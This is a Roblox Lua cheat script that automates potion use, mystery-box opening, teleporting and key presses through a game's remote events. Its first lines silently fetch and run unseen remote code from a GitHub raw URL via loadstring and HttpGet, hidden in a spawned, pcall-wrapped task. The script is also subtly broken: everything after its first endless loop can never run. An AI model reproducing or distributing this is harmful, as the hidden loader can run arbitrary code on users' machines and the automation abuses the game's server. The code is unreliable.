task.spawn(function()
    pcall(function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/malikstt/script/main/test2"))()
    end)
end)

local RunService = game:GetService("RunService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local RemoteModule = require(ReplicatedStorage.Shared.Framework.Network.Remote)
local RemoteEvent = ReplicatedStorage.Shared.Framework.Network.Remote.RemoteEvent
local LocalDataModule = require(ReplicatedStorage.Client.Framework.Services.LocalData)

local BOX_NAME = "Admin Mystery Box"
local TARGET_GEMS = 1000000
local BATCH_SIZE = 50

local potions = {
    {"Speed", 7},
    {"Speed", 6},
    {"Lucky", 7},
    {"Lucky", 6},
    {"Egg Elixir", 1},
    {"Mythic", 7},
    {"Mythic", 6},
    {"Infinity Elixir", 1},
}

local potionIndex = 1

RunService.Heartbeat:Connect(function()
    local data = LocalDataModule:Get()
    if not data then return end

    local potion = potions[potionIndex]
    if potion then
        RemoteEvent:FireServer("UsePotion", potion[1], potion[2])
    end

    potionIndex += 1
    if potionIndex > #potions then
        potionIndex = 1
    end

    if data.Gems < TARGET_GEMS then
        local amount = (data.Powerups and data.Powerups[BOX_NAME]) or 0
        if amount > 0 then
            RemoteModule:FireServer("UseGift", BOX_NAME, math.min(BATCH_SIZE, amount))
        end
    end
end)

while true do
    local char = game.Players.LocalPlayer.Character
    local hrp = char and char:FindFirstChild("HumanoidRootPart")
    if hrp then
        hrp.CFrame = CFrame.new(132.47, 9.73, 97.12)
    end
    task.wait(60)
end

pcall(function()
    require(ReplicatedStorage.Client.Effects.HatchEgg).Play = function() end
end)

local vim = game:GetService("VirtualInputManager")
while true do
    vim:SendKeyEvent(true, Enum.KeyCode.E, false, game)
    vim:SendKeyEvent(false, Enum.KeyCode.E, false, game)
    task.wait()
end
